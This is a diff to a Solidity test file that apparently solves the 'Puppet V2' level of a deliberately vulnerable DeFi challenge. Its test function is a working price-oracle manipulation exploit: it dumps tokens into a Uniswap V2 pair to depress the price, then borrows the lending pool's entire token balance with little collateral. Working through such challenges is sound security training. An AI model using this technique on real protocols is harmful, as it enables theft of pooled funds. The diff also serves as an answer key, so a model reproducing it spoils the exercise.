@@ -99,14 +99,36 @@ contract PuppetV2 is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+    function testExploit_PuppetV2() public {
+        emit log("-------------------------- before attack ---------------------------------");
+        uint256 v2PairBalance = dvt.balanceOf(address(puppetV2Pool));
+        emit log_named_decimal_uint("v2PairBalance:", v2PairBalance, 18);
+        emit log_named_decimal_uint("attacker should eth to brrow", puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 18);
 
-        /**
-         * EXPLOIT END *
-         */
+        emit log("-------------------------- after attack ---------------------------------");
+        vm.startPrank(attacker);
+        weth.deposit{value: ATTACKER_INITIAL_ETH_BALANCE}();
+
+        uint256 swapOutETH = uniswapV2Router.getAmountOut(ATTACKER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_WETH_RESERVE);
+        emit log_named_decimal_uint("attacker could swap out ETH", swapOutETH, 18);
+
+        dvt.transfer(address(uniswapV2Pair), ATTACKER_INITIAL_TOKEN_BALANCE);
+        if (address(dvt) < address(weth)){
+            uniswapV2Pair.swap(0, swapOutETH, address(attacker), "");
+        }
+        else{
+            uniswapV2Pair.swap(swapOutETH, 0, address(attacker), "");
+        }
+
+        uint256 shouldETH = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        emit log_named_decimal_uint("attacker should ETH", shouldETH, 18);
+        emit log_named_decimal_uint("attacker actually hold ETH amount", address(attacker).balance, 18);
+
+        weth.approve(address(puppetV2Pool), shouldETH);
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        
+        vm.stopPrank();
+
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
